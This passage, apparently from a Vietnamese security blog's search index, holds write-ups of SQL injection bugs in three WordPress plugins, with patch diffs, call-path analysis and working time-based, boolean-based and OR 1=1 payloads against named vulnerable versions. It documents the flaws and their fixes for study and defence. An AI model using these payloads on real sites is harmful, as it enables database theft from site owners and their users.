ƒë·ªÅ WHERE: MySQL c√≥ th·ªÉ t·ªëi ∆∞u h√≥a v√† b·ªè qua subquery n·∫øu k·∫øt qu·∫£ c√≥ th·ªÉ x√°c ƒë·ªãnh s·ªõm. N·∫øu b·∫£ng kh√¥ng c√≥ d·ªØ li·ªáu, k·∫øt qu·∫£ cu·ªëi c√πng s·∫Ω l√† t·∫≠p r·ªóng, MySQL kh√¥ng c·∫ßn th·ª±c thi SLEEP(). Subquery trong m·ªánh ƒë·ªÅ FROM: Truy v·∫•n con ƒë∆∞·ª£c coi l√† b·∫£ng t·∫°m th·ªùi. MySQL ph·∫£i th·ª±c thi truy v·∫•n con n√†y ƒë·∫ßu ti√™n ƒë·ªÉ t·∫°o b·∫£ng t·∫°m th·ªùi, sau ƒë√≥ m·ªõi th·ª±c thi truy v·∫•n ch√≠nh. Get First Letter of Database Name ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ dump ƒë∆∞·ª£c h·∫øt data l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ g·∫ßn nh∆∞ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.\nG·ª≠i request v·ªõi SQLi payload:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded; charset=UTF-8 ... Cookie: cookie_here action=ONLINE_ADAv4/save_false_positive\u0026amp;issue_id=1\u0026amp;scan_id=1 UNION SELECT IF(SUBSTRING(SCHEMA(),1,1)=0x77, SLEEP(5), 1) S·ª≠ d·ª•ng SUBSTRING() ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name, IF() tr·∫£ v·ªÅ SLEEP(5) n·∫øu k√Ω t·ª± ƒë√≥ l√† 0x77(\u0026lsquo;w\u0026rsquo;)\nS·ª≠ d·ª•ng hex encoding w th√†nh 0x77 v√¨ nh∆∞ ph√¢n t√≠ch ·ªü tr√™n, scan_id s·∫Ω b·ªã escape.\nüëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u0026gt; k√≠ t·ª± ƒë·∫ßu ti√™n ƒë√∫ng l√† w.\nAutomatic Extraction D·ª±a tr√™n kƒ© thu·∫≠t Timebased SQLi ta vi·∫øt script ƒë·ªÉ t·ª± ƒë·ªông khai th√°c.\nScript Here\nConclusion L·ªó h·ªïng CVE-2025-32650 trong plugin WordPress Accessibility Suite tr∆∞·ªõc phi√™n b·∫£n 4.19 xu·∫•t ph√°t t·ª´ vi·ªác tri·ªÉn khai kh√¥ng ƒë√∫ng h√†m $wpdb-\u0026gt;prepare() d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nB·∫£n v√° ch√≠nh th·ª©c ƒë√£ tri·ªÉn khai ƒë√∫ng $wpdb-\u0026gt;prepare, gi√∫p ƒë·∫£m b·∫£o d·ªØ li·ªáu ƒë·∫ßu v√†o ƒë∆∞·ª£c ki·ªÉm so√°t v√† an to√†n h∆°n.\nKey takeaways:\nLu√¥n s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection. Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng. References SQL Injection cheat sheet - PortSwigger\nWordPress Accessibility Suite Plugin \u0026lt;= 4.18 is vulnerable to SQL Injection ","permalink":"//localhost:1313/vi/posts/2025-09-09-cve-2025-32650/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eAccessibility Suite\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e4.19\u003c/strong\u003e. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-32650\"\u003eCVE-2025-32650\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/online-accessibility/\"\u003eWordPress Accessibility Suite Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 4.18\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (8.5)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Subscriber\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAccessibility Suite\u003c/strong\u003e:  v4.18(vul) v√† v4.19(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003e·ª®ng d·ª•ng ch∆∞a th·ª±c hi·ªán √©p ki·ªÉu cho \u003cstrong\u003einput\u003c/strong\u003e v√† m·∫∑c d√π c√≥ s·ª≠ d·ª•ng \u003ccode\u003eprepare()\u003c/code\u003e ƒë·ªÉ ch·ªëng SQLi, nh∆∞ng do tri·ªÉn khai kh√¥ng ƒë√∫ng n√™n l·ªó h·ªïng SQLi v·∫´n t·ªìn t·∫°i.\u003c/p\u003e","title":"CVE-2025-32650"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Mail Mint c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 1.18.6. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-58604 Product: WordPress Mail Mint Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.18.5 CVSS severity: Low (7.6) Required Privilege: Administrator Requirements Local WordPress and Debugging Mail Mint: v1.18.5(vul) v√† v1.18.6(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis ·ª®ng d·ª•ng ƒë√£ ƒë∆∞a tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u query SQL m√† kh√¥ng s·ª≠ d·ª•ng c√°c bi·ªán ph√°p b·∫£o v·ªá khi·∫øn l·ªó h·ªïng SQL Injection x·∫£y ra.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file /app/Utilities/Helper/Import.php\npublic static function get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0) { // other logic global $wpdb; $total_query = \u0026#34;SELECT COUNT(DISTINCT user_id) as total FROM {$wpdb-\u0026gt;prefix}usermeta WHERE meta_key IN (\u0026#39;\u0026#34; . implode(\u0026#34;\u0026#39;, \u0026#39;\u0026#34;, $keys) . \u0026#34;\u0026#39;)\u0026#34;; $total = $wpdb-\u0026gt;get_var($total_query); //phpcs:ignore // Final query to retrieve user IDs with limit and offset. $final_query = \u0026#34;SELECT user_id FROM {$wpdb-\u0026gt;prefix}usermeta WHERE meta_key IN (\u0026#39;\u0026#34; . implode(\u0026#34;\u0026#39;, \u0026#39;\u0026#34;, $keys) . \u0026#34;\u0026#39;) GROUP BY user_id LIMIT $number OFFSET $offset\u0026#34;; $users = $wpdb-\u0026gt;get_results($final_query, ARRAY_A); //phpcs:ignore // other logic } {: file=\u0026quot;/app/Utilities/Helper/Import.php v1.18.5\u0026quot; }\nB·∫£n v√° s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() thay v√¨ truy·ªÅn tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u query.\npublic static function get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0) { // other logic global $wpdb; // Total query (safe with prepare) $total_query = $wpdb-\u0026gt;prepare( \u0026#34;SELECT COUNT(DISTINCT user_id) as total FROM {$wpdb-\u0026gt;usermeta} WHERE meta_key IN ($placeholders)\u0026#34;, $keys ); $total = $wpdb-\u0026gt;get_var($total_query); //phpcs:ignore // Final query with LIMIT \u0026amp; OFFSET (safe with prepare) $final_query = $wpdb-\u0026gt;prepare( \u0026#34;SELECT user_id FROM {$wpdb-\u0026gt;usermeta} WHERE meta_key IN ($placeholders) GROUP BY user_id LIMIT %d OFFSET %d\u0026#34;, array_merge($keys, array($number, $offset)) ); $users = $wpdb-\u0026gt;get_results($final_query, ARRAY_A); //phpcs:ignore // other logic } {: file=\u0026quot;/app/Utilities/Helper/Import.php v1.18.6\u0026quot; }\nHow it work? L·ªó h·ªïng n·∫±m trong h√†m get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0) c·ªßa class Import. ƒê·ªÉ x√°c ƒë·ªãnh n∆°i n√≥ ƒë∆∞·ª£c g·ªçi, ta t√¨m ki·∫øm v·ªõi t·ª± kh√≥a get_wp_users_by_learndash_with_limit_offset trong th∆∞ m·ª•c ch·ª©a plugin.\nK·∫øt qu·∫£ cho th·∫•y h√†m n√†y ƒë∆∞·ª£c g·ªçi trong:\nretrieve_contacts_associated_with_learndash() perform_learndash_user_import() thu·ªôc class ContactImportAction trong file /app/API/Actions/Admin/Contact/ContactImportAction.php.\nTi·∫øp theo, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i retrieve_contacts_associated_with_learndash() ƒë∆∞·ª£c s·ª≠ d·ª•ng, ta t√¨m ki·∫øm t·ª´ kh√≥a retrieve_contacts_associated_with_learndash trong th∆∞ m·ª•c plugin.\nH√†m n√†y ƒë∆∞·ª£c g·ªçi trong map_contacts_with_learndash() thu·ªôc class ContactImportController trong file /app/API/Controllers/Admin/Contact/ContactImportController.php.\nTi·∫øp t·ª•c t√¨m ki·∫øm t·ª´ kh√≥a map_contacts_with_learndash ƒë·ªÉ xem h√†m n√†y ƒë∆∞·ª£c ƒëƒÉng k√Ω ·ªü ƒë√¢u:\nTa ph√°t hi·ªán r·∫±ng n√≥ ƒë∆∞·ª£c d√πng l√†m callback c·ªßa REST API th√¥ng qua h√†m register_rest_route() trong WordPress:\nclass ContactImportRoute extends AdminRoute { public function register_routes() { register_rest_route( $this-\u0026gt;namespace, // mrm/v1 $this-\u0026gt;rest_base . \u0026#39;/learndash/map\u0026#39;, // contacts/import/learndash/map/ array( array( \u0026#39;methods\u0026#39; =\u0026gt; WP_REST_Server::CREATABLE, // POST \u0026#39;callback\u0026#39; =\u0026gt; array( $this-\u0026gt;controller, \u0026#39;map_contacts_with_learndash\u0026#39; ), \u0026#39;permission_callback\u0026#39; =\u0026gt; PermissionManager::current_user_can(\u0026#39;mint_manage_contacts\u0026#39;), // Admin \u0026#39;args\u0026#39; =\u0026gt; array( \u0026#39;selectedCourses\u0026#39; =\u0026gt; array( \u0026#39;description\u0026#39; =\u0026gt; __( \u0026#39;The selected courses from which to import contacts.\u0026#39;, \u0026#39;mrm\u0026#39; ), \u0026#39;required\u0026#39; =\u0026gt; true, \u0026#39;type\u0026#39; =\u0026gt; \u0026#39;array\u0026#39;, \u0026#39;sanitize_callback\u0026#39; =\u0026gt; \u0026#39;rest_sanitize_array\u0026#39;, ) ), // array + required ), ) ); // other logic } // other logic } Lu·ªìng g·ªçi h√†m:\nPOST /wp-json/mrm/v1/contacts/import/learndash/map ƒë∆∞·ª£c g·ª≠i t·ªõi REST API c√πng tham s·ªë b·∫Øt bu·ªôc selectedCourses. map_contacts_with_learndash(WP_REST_Request $request) l√† callback ƒë∆∞·ª£c g·ªçi: Nh·∫≠n $request l√†m tham s·ªë ƒë·∫ßu v√†o. L·∫•y c√°c tham s·ªë c·ªßa $request chuy·ªÉn th√†nh m·∫£ng $params Callback g·ªçi retrieve_contacts_associated_with_learndash() v·ªõi ƒë·ªëi s·ªë l√† $params. retrieve_contacts_associated_with_learndash() g·ªçi get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0): $courses = $params['selectedCourses'], $number = 5 $keys l√† m·ªôt m·∫£ng ƒë∆∞·ª£c t·∫°o ra b·∫±ng c√°ch l·∫•y t·∫•t c·∫£ gi√° tr·ªã value trong $courses, sau ƒë√≥ gh√©p chu·ªói theo m·∫´u course_{COURSE_ID}_access_from Tr∆∞·ªõc khi ƒë∆∞a v√†o c√¢u query, m·∫£ng $keys ƒë∆∞·ª£c n·ªëi th√†nh m·ªôt chu·ªói b·∫±ng h√†m implode(). N·∫øu $keys ch·ªâ c√≥ m·ªôt ph·∫ßn t·ª≠, k·∫øt qu·∫£ c·ªßa implode() ch√≠nh l√† gi√° tr·ªã chu·ªói c·ªßa ph·∫ßn t·ª≠ ƒë√≥. Th·ª±c thi query, tr·∫£ v·ªÅ JSON ch·ª©a formatted_users + total_users Exploit Sau khi ph√¢n t√≠ch, ta th·∫•y tham s·ªë selectedCourses ƒë∆∞·ª£c x·ª≠ l√Ω qua nhi·ªÅu logic tr∆∞·ªõc khi truy·ªÅn v√†o query ch·ª©a SQLi, quan tr·ªçng ta v·∫´n ki·ªÉm so√°t ƒë∆∞·ª£c gi√° tr·ªã c·ªßa key value.\nPOST request qua BurpSuite:\nTa g·ª≠i request v·ªõi m·ªôt key duy nh·∫•t =\u0026gt; d·ªÖ d√†ng ki·ªÉm so√°t c√¢u query\nKhi ƒë√≥, c√¢u query tr·ªü th√†nh\nSELECT user_id FROM wp_usermeta WHERE meta_key IN (\u0026#39;course_abc\u0026#39;) OR 1=1 -- _access_from\u0026#39;) GROUP BY user_id LIMIT 5 OFFSET 0 ') tho√°t kh·ªèi IN 1=1 lu√¥n ƒë√∫ng =\u0026gt; tr·∫£ v·ªÅ t√¢t c·∫£ user_id trong wp_usermeta ƒêo·∫°n code c√≤n l·∫°i trong get_wp_users_by_learndash_with_limit_offset s·∫Ω truy v·∫•n meta th√¥ng tin c·ªßa t·∫•t c·∫£ user tr·∫£ v·ªÅ:\n$formatted_users = array_map( function ($user) { $user-\u0026gt;usermeta = array_map( function ($user_data) { return reset($user_data); }, get_user_meta($user-\u0026gt;ID) ); return $user; }, $contacts ); Conclusion L·ªó h·ªïng CVE-2025-58604 trong plugin WordPress Mail Mint tr∆∞·ªõc phi√™n b·∫£n 1.18.6 xu·∫•t ph√°t t·ª´ vi·ªác kh√¥ng s·ª≠ d·ª•ng c∆° ch·∫ø chu·∫©n b·ªã truy v·∫•n ($wpdb-\u0026gt;prepare) m√† truy·ªÅn tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u l·ªánh SQL d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nB·∫£n v√° ch√≠nh th·ª©c ƒë√£ thay th·∫ø vi·ªác n·ªëi chu·ªói b·∫±ng c√°ch d√πng $wpdb-\u0026gt;prepare, gi√∫p ƒë·∫£m b·∫£o d·ªØ li·ªáu ƒë·∫ßu v√†o ƒë∆∞·ª£c ki·ªÉm so√°t v√† an to√†n h∆°n.\nKey takeaways:\nLu√¥n s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection. Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng. References SQL Injection cheat sheet - PortSwigger\nWordPress Mail Mint Plugin \u0026lt;= 1.18.5 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-04-cve-2025-58604/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eMail Mint\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e1.18.6\u003c/strong\u003e. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-58604\"\u003eCVE-2025-58604\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/mail-mint/\"\u003eWordPress Mail Mint Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.18.5\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: Low (7.6)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eMail Mint\u003c/strong\u003e:  v1.18.5(vul) v√† v1.18.6(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003e·ª®ng d·ª•ng ƒë√£ ƒë∆∞a tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u query SQL m√† \u003cstrong\u003ekh√¥ng s·ª≠ d·ª•ng c√°c bi·ªán ph√°p b·∫£o v·ªá\u003c/strong\u003e khi·∫øn l·ªó h·ªïng SQL Injection x·∫£y ra.\u003c/p\u003e","title":"CVE-2025-58604"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Easy Quotes c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 1.2.3. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-26943 Product: WordPress Easy Quotes Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.2.2 CVSS severity: High (9.3) Required Privilege: Unauthenticated Requirements Local WordPress and Debugging Taskbuilder Plugin: v1.2.2(vul) v√† v1.2.3(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis ·ª®ng d·ª•ng ƒë√£ ƒë∆∞a tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u query SQL m√† kh√¥ng s·ª≠ d·ª•ng c√°c bi·ªán ph√°p b·∫£o v·ªá khi·∫øn l·ªó h·ªïng SQL Injection x·∫£y ra.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file includes/quotes-data.php\nprivate static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; return $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM `\u0026#34;.$tablename.\u0026#34;` WHERE `family`=\u0026#39;\u0026#34;.$family.\u0026#34;\u0026#39;;\u0026#34;); } {: file=\u0026ldquo;includes/quotes-data.php v1.2.2\u0026rdquo; }\nB·∫£n v√° s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() thay v√¨ truy·ªÅn tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u query.\nprivate static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; $sql = $wpdb-\u0026gt;prepare( \u0026#34;SELECT * FROM %i WHERE `family` = %s\u0026#34;, $tablename, $family ); return $wpdb-\u0026gt;get_row($sql); } {: file=\u0026ldquo;includes/quotes-data.php v1.2.3\u0026rdquo; }\nC√≥ nhi·ªÅu h√†m c≈©ng ƒë∆∞·ª£c v√° b·∫±ng c√°ch tr√™n, nh∆∞: get_font_variant($family_id, $variant_id), get_font_variants($family), get_fonts($category = -1)\nTuy get_fonts_categories() ƒë√£ ƒë∆∞·ª£c v√° nh∆∞ng n√≥ kh√¥ng ch·ª©a d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng, n√™n kh√¥ng c·∫ßn quan t√¢m\npublic static function get_fonts_categories() { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-categories\u0026#39;; $sql = $wpdb-\u0026gt;prepare( \u0026#34;SELECT `category_id`, `category` FROM %i\u0026#34;, $tablename ); return $wpdb-\u0026gt;get_results($sql); } {: file=\u0026ldquo;includes/quotes-data.php v1.2.3\u0026rdquo; }\nHow it work? Ta khai th√°c l·ªói SQL Injection trong h√†m get_family_data($family), c√°c h√†m c√≤n l·∫°i khai th√°c t∆∞∆°ng t·ª±.\nget_family_data() l√† h√†m public trong class Quotes_Data\nclass Quotes_Data { function __construct() { add_filter(\u0026#39;posts_where\u0026#39;, array($this, \u0026#39;posts_where\u0026#39;), 10, 2); } // other function public static function get_font_variants($family) { $familyData = self::get_family_data($family); // other logic } public static function get_family($family, $variant_id) { $family_data = (array)self::get_family_data($family); // other logic } private static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; return $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM `\u0026#34;.$tablename.\u0026#34;` WHERE `family`=\u0026#39;\u0026#34;.$family.\u0026#34;\u0026#39;;\u0026#34;); } } {: file=\u0026ldquo;includes/quotes-data.php v1.2.2\u0026rdquo; }\nget_family_data() ƒë∆∞·ª£c g·ªçi trong 2 h√†m get_family() v√† get_font_variants() c·ªßa class Quotes_Data, ƒë·ªÉ bi·∫øt ch√∫ng s·ª≠ d·ª•ng ·ªü ƒë√¢u, ta t√¨m ki·∫øn v·ªõi t·ª´ kh√≥a get_family ho·∫∑c get_font_variants\nH√†m get_font_variants() ƒë∆∞·ª£c g·ªçi trong h√†m rest_route_callback_font_variants() c·ªßa class Quotes_Rest_Route\nclass Quotes_Rest_Route { function __construct() { add_action(\u0026#39;rest_api_init\u0026#39;, array($this, \u0026#39;rest_api_init\u0026#39;)); } /** * Register my REST route * * @return void */ function rest_api_init($wp_rest_server) { $args = [ \u0026#39;method\u0026#39; =\u0026gt; WP_REST_Server::READABLE, \u0026#39;callback\u0026#39; =\u0026gt; [$this, \u0026#39;rest_route_callback_quote\u0026#39;], \u0026#39;permission_callback\u0026#39; =\u0026gt; \u0026#39;__return_true\u0026#39; ]; register_rest_route(\u0026#39;layart/v1\u0026#39;, \u0026#39;/quote\u0026#39;, $args); // other logic $args[\u0026#39;callback\u0026#39;] = [$this, \u0026#39;rest_route_callback_font_variants\u0026#39;]; register_rest_route(\u0026#39;layart/v1\u0026#39;, \u0026#39;/font-variants\u0026#39;, $args); } // other function function rest_route_callback_font_variants(WP_REST_Request $request) { $family = $request-\u0026gt;get_param(\u0026#39;family\u0026#39;); $family = isset($family) ? $family : \u0026#34;Shadows Into Light\u0026#34;; $response = Quotes_Data::get_font_variants($family); return rest_ensure_response($response); } } H√†m kh·ªüi t·∫°o c·ªßa class Quotes_Rest_Route s·ª≠ d·ª•ng add_action(hook_name, callback) v·ªõi hook_name l√† rest_api_init ƒë·ªÉ ƒëƒÉng k√Ω c√°c endpoint t√πy ch·ªânh v·ªõi REST API System c·ªßa WordPress\nCallback rest_api_init s·ª≠ d·ª•ng register_rest_route nhi·ªÅu l·∫ßn ƒë·ªÉ t·∫°o c√°c endpoint d∆∞·ªõi namespace layart/v1\nrest_route_callback_font_variants l√† callback c·ªßa endpoint /wp-json/layart/v1/font-variants?family=family_name\n$family m·∫∑c ƒë·ªãnh l√† Shadows Into Light n·∫øu kh√¥ng ƒë∆∞·ª£c truy·ªÅn trong param.\nExploit Detect SQLi Ta th·ª≠ k·ªπ thu·∫≠t Boolean-based SQL Injection ƒë·ªÉ ki·ªÉm tra xem tham s·ªë family c√≥ d·ªÖ b·ªã ch√®n l·ªánh SQL hay kh√¥ng.\nTrue request: Khi ƒë√≥, c√¢u query th·ª±c thi s·∫Ω tr·ªü th√†nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+\u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;\u0026#34; ƒêi·ªÅu ki·ªán AND '1'='1' lu√¥n ƒë√∫ng =\u0026gt; query h·ª£p l·ªá, tr·∫£ v·ªÅ d·ªØ li·ªáu b√¨nh th∆∞·ªùng.\nFalse request: Khi ƒë√≥, c√¢u query th·ª±c thi s·∫Ω tr·ªü th√†nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+\u0026#39;1\u0026#39;=\u0026#39;2\u0026#39;\u0026#34; ƒêi·ªÅu ki·ªán AND '1'='2' lu√¥n sai =\u0026gt; query kh√¥ng kh·ªõp =\u0026gt; tr·∫£ v·ªÅ [].\nGet First Letter of Database Name ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ dump ƒë∆∞·ª£c h·∫øt data l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.\nDatabase name ƒë∆∞·ª£c t√¥i ƒë·∫∑t t√™n l√† wordpress n√™n k√≠ t·ª± ƒë·∫ßu ti√™n l√† w {: .prompt-info }\nResponse tr·∫£ v·ªÅ d·ªØ li·ªáu b√¨nh th∆∞·ªùng =\u0026gt; k√≠ t·ª± ƒë·∫ßu ti√™n l√† w\nKhi ƒë√≥, c√¢u query th·ª±c thi s·∫Ω tr·ªü th√†nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+SUBSTRING(DATABASE(),1,1)=\u0026#39;w\u0026#39;\u0026#34; Automatic Extraction D·ª±a tr√™n kƒ© thu·∫≠t boolean base ta vi·∫øt script ƒë·ªÉ t·ª± ƒë·ªông khai th√°c.\nScript Here\nConclusion L·ªó h·ªïng CVE-2025-26943 trong plugin WordPress Easy Quotes tr∆∞·ªõc phi√™n b·∫£n 1.2.3 xu·∫•t ph√°t t·ª´ vi·ªác 